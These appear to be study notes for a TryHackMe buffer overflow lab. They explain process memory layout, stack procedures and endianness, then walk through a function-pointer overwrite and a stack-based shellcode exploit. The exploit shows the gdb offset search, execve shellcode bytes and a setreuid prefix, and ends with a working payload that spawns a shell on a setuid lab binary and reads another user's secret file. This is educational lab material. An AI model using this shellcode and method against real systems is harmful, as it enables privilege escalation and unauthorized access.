# Buffer overflows

## Process layout

When a program runs on a machine, the computer runs the program as a **process**. 

> Current computer architecture allows multiple processes to be run concurrently(at the same time by a computer)

While these processes may appear to run at the same time, the computer actually switches between the processes very quickly and makes it look like they are running at the same time. Switching between processes is called a **context switch**. 

Since each process may need different information to run(e.g. The current instruction to execute), the operating system has to keep track of all the information in a process. The memory in the process is organized sequentially and has the following layout:

![](https://raw.githubusercontent.com/amirr0r/notes/master/Infosec/Reverse/images/Schema-memoire-programme.png)

- The **stack** contains the information required to run the program. This information would include the _current program counter_, _saved registers_, _local arguments_ and more information. The section after the user stack is unused memory and it is used in case the stack grows(downwards)

- Shared library regions are used to either statically/dynamically link libraries that are used by the program.

- The **heap** increases and decreases dynamically depending on whether a program _dynamically_ assigns memory. Notice there is a section that is unassigned above the heap which is used in the event that the size of the heap increases.

- The program code and data stores the program executable and initialized variables

## x86-64 Procedures 

The top of the stack is at the lowest memory address and the stack grows towards lower memory addresses.

![](https://raw.githubusercontent.com/amirr0r/notes/master/Infosec/Reverse/images/stack.png)

- `push var` => push a value onto the stack
    + Decrements the stack pointer (known as `rsp`) by 8
    + Writes above value to new location of `rsp`, which is now the top of the stack
- `pop var` => reads the value at the address given by the stack pointer and pop it off the stack.
    + Increment the stack pointer by 8
    + Store the value that was read from `rsp` into `var`

Each compiled program may include multiple functions, where each function would need to store local variables, arguments passed to the function and more. To make this easy to manage, each function has its own separate stack frame, where each new stack frame is allocated when a function is called, and deallocated when the function is complete. 

![](https://i.imgur.com/0OsNBwQ.png

- `rax` is caller saved
- `rdi`, `rsi`, `rdx`, `rcx` `r8` and `r9` are called saved(and they are usually arguments for functions)
- `r10`, `r11` are caller saved
- `rbx`, `r12`, `r13`, `r14` are callee saved 
- `rbp` is also callee saved(and can be optionally used as a frame pointer)
- `rsp` is callee saved

## Endianess

Let's say we want to represent `0x12345678`.

Little Endian is where the value is arranged from the least significant byte to the most significant byte:

![](https://i.imgur.com/tSYo8AS.png)

Big Endian is where the value is arranged from the most significant byte to the least significant byte:

![](https://i.imgur.com/ltUjHQ7.png)

## Overwriting Function Pointers 

1. Retrieve the `special()` address:

    ```console
    [user1@ip-10-10-58-204 overflow-2]$ nm func-pointer | grep special
    0000000000400567 T special
    ```

2. In Kali (Python shell), print the address (``) in Little Endian:

    ```python
    >>> import pwn
    >>> pwn.p64(0x0000000000400567)
    'g\x05@\x00\x00\x00\x00\x00'
    ```

3. Exploit the buffer overflow:

    ```console
    [user1@ip-10-10-58-204 overflow-2]$ python -c "print('A' * 14 + 'g\x05@\x00\x00\x00\x00\x00')" | ./func-pointer 
    this is the special function
    you did this, friend!
    ```

## Buffer Overflow 1

- `python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"`

- `python -c "print('\x90' * 30 + '\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05' + '\x41' * 60 +  '\xef\xbe\xad\xde') | ./program_name"`

- Use `gdb` to calculate the offset:

```bash
[user1@ip-10-10-58-204 overflow-3]$ gdb -q ./buffer-overflow
Reading symbols from ./buffer-overflow...(no debugging symbols found)...done.
(gdb) run $(python -c "print('A'*144)")
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*144)")
Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000200000000 in ?? ()

...

(gdb) run $(python -c "print('A'*158)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*158)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? ()
```

We're now able to wryte **6 bytes**!

- Getting the return address of our shellcode:

```bash
(gdb) run $(python -c "print('\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6)")
Here's a program that echo's out your input
������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j<XH1�����������������������BBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()
(gdb) x/100x $rsp-200
0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
0x7fffffffe248: 0xffffe649      0x00007fff      0x90909090      0x90909090
0x7fffffffe258: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe268: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe278: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe288: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe298: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe2a8: 0x3b6a9090      0xd2314858      0x2f2fb849      0x2f6e6962
0x7fffffffe2b8: 0xc1496873      0x504108e8      0x52e78948      0xe6894857
0x7fffffffe2c8: 0x3c6a050f      0xff314858      0x9090050f      0x90909090
0x7fffffffe2d8: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe2e8: 0x42424242      0x00004242      0xffffe3e8      0x00007fff
0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
0x7fffffffe338: 0xf7c96812      0xce86949f      0x00400450      0x00000000
0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000
0x7fffffffe358: 0x00000000      0x00000000      0x3aa96812      0x31796be0
0x7fffffffe368: 0xa34d6812      0x31797b57      0x00000000      0x00000000
0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff
0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000
0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000
```

The address `0x7fffffffe288` works fine (any address between the NOP sled and the shellcode will work)

-  Use `pwntools` to generate a prefix to our shellcode to run `SETREUID`:

```bash
$ pwn shellcraft -f d amd64.linux.setreuid 1002
\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
$ python
>>> len('\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')
14
```

- Our payload:

```
┌───────────────────┬────────────────────┬────────────────────┬────────────────────┬────────────────────┐
│ NOP sled (90)     │  setreuid (14)     │ shellcode (40)     │ random chars (8)   │ Memory address (6) │
└───────────────────┴────────────────────┴────────────────────┴────────────────────┴────────────────────┘
total length = 90 + 14 + 40 + 8 + 6 = 158
```

- Finally:

```console
[user1@ip-10-10-58-204 overflow-3]$ ls -lah
total 20K
drwxrwxr-x 2 user1 user1   72 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwsrwxr-x 1 user2 user2 8.1K Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
[user1@ip-10-10-58-204 overflow-3]$ ./buffer-overflow $(python -c "print('\x90'*90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*8 + '\x88\xe2\xff\xff\xff\x7f')")
Here's a program that echo's out your input
������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1��������������
sh-4.2$ ls
buffer-overflow  buffer-overflow.c  secret.txt
sh-4.2$ cat secret.txt 
omgyoudidthissocool!!
sh-4.2$ 
```

- [Shellcode link](https://www.arsouyes.org/blog/2019/54_Shellcode/)

## Buffer Overflow 2

Same process as previous task

## Useful link

- [aldeid THM Buffer overflows](https://www.aldeid.com/wiki/TryHackMe-Buffer-Overflows#Buffer_Overflows)